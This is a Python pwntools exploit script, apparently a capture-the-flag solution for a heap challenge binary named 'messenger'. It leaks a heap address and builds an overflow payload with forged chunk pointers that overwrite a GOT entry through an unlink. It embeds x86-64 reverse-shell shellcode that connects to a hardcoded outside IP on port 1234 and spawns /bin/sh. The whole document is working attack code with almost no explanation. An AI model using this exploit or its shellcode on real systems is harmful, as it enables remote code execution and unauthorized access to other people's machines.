#!/usr/bin/python
from pwn import *
import time


IPADDR = "\x79\x87\x96\xd5"#121.135.150.213
#IPADDR = "\x7f\x00\x00\x01"#127.0.0.1
PORT = "\x04\xd2"#1234
shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
shellcode += "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
shellcode += "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
shellcode += "\x02"+PORT+"\xc7\x44\x24\x04"+IPADDR+"\x48\x89\xe6\x6a\x10"
shellcode += "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
shellcode += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
shellcode += "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"#//bin/sh
shellcode += "\x5f\x6a\x3b\x58\x0f\x05";

p = process("./messenger")
#p = remote("110.10.212.137", 3333)

#1. fill heap chunks 1,2
print p.recvuntil(">> ")
p.sendline("L\x00")
print p.recvuntil("size : ")
p.sendline("32")
print p.recvuntil("msg : ")
p.sendline("a"*31)

print p.recvuntil(">> ")
p.sendline("L\x00")
print p.recvuntil("size : ")
p.sendline("32")
print p.recvuntil("msg : ")
p.sendline("b"*31)

#2. get heap address
print p.recvuntil(">> ")
p.sendline("C\x00")
print p.recvuntil("index : ")
p.sendline("0")
print p.recvuntil("size : ")
p.sendline("64")
print p.recvuntil("msg : ")
p.sendline("a"*63)

print p.recvuntil(">> ")
p.sendline("V\x00")
print p.recvuntil("index : ")
p.sendline("0")
print p.recv(64)
addr = p.recv(4)
print addr.encode('hex')
print p64(u32(addr))
addr1 = p64(u32(addr)+ 24) 
shellcode_addr = hex(u32(addr)+0x60)

#
print p.recvuntil(">> ")
p.sendline("C\x00")
print p.recvuntil("index : ")
p.sendline("0")
print p.recvuntil("size : ")
push_ret = asm("push "+shellcode_addr+"; ret", arch="amd64", os="linux")
payload2 = push_ret+"A"*(56-len(push_ret)) + p64(u32(addr)+24)+ p64(0x602018-0x8) + shellcode + "\n"
#push shellcode_addr; ret
#next = push &shellcode_addr; ret 
#prev = put got addr - 8 ( why -8? --> prev+8 = next )
#shellcode
p.sendline(str(len(payload2)))
print p.recvuntil("msg : ")
p.send(payload2)


#remove message -> trigger
print p.recvuntil(">> ")
p.sendline("R\x00")
print p.recvuntil("index : ")
p.sendline("1")
p.interactive()

p.close()
